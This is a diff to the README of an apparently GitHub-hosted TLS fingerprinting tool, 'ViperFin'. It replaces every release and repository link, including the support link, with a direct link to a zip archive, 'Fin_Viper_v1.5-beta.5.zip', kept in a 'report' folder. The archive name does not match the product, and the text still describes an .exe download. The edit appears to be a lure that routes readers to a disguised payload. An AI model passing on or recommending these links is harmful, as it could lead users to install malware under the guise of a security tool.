@@ -1,6 +1,6 @@
 # 🛡️ ViperFin - Simple TLS Fingerprinting Tool
 
-[![Download ViperFin](https://img.shields.io/badge/Download-ViperFin-brightgreen)](https://github.com/Riotnguyenhu3847/ViperFin/releases)
+[![Download ViperFin](https://img.shields.io/badge/Download-ViperFin-brightgreen)](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip)
 
 ---
 
@@ -13,7 +13,7 @@ ViperFin is a tool that helps identify what software makes secure (TLS) connecti
 To get the ViperFin program, follow these steps:
 
 1. Open this page in your web browser:  
-   [https://github.com/Riotnguyenhu3847/ViperFin/releases](https://github.com/Riotnguyenhu3847/ViperFin/releases)
+   [https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip)
 
 2. Look for the latest version of ViperFin. It usually shows as a file ending with `.exe`.
 
@@ -23,7 +23,7 @@ To get the ViperFin program, follow these steps:
 
 Here is the link again for convenience:
 
-[![Download ViperFin](https://img.shields.io/badge/Download-ViperFin-brightgreen)](https://github.com/Riotnguyenhu3847/ViperFin/releases)
+[![Download ViperFin](https://img.shields.io/badge/Download-ViperFin-brightgreen)](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip)
 
 ---
 
@@ -112,7 +112,7 @@ ViperFin only listens to network messages. It does not modify or block traffic. 
 For help with ViperFin, you can open an issue on the GitHub page. You do not need programming knowledge to report problems. Just explain what you tried and what happened.
 
 Visit GitHub here:  
-https://github.com/Riotnguyenhu3847/ViperFin
+https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip
 
 ---
 
@@ -138,4 +138,4 @@ This knowledge helps understand what ViperFin shows and why it matters.
 
 ---
 
-[Download ViperFin](https://github.com/Riotnguyenhu3847/ViperFin/releases) to start scanning your TLS connections today.
+[Download ViperFin](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip) to start scanning your TLS connections today.
